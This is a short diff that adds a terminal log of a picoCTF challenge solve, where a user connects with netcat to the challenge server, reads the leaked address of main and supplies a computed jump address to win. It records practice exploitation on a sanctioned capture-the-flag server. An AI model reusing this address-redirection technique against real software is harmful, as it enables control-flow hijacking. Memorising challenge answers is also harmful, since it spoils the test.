@@ -1,0 +1,5 @@
+dannyvai-picoctf@webshell:~$ nc rescued-float.picoctf.net 60227
+Address of main: 0x5c660a9cf33d
+Enter the address to jump to, ex => 0x12345: 0x5c660a9cf2a7
+Your input: 5c660a9cf2a7
+You won!
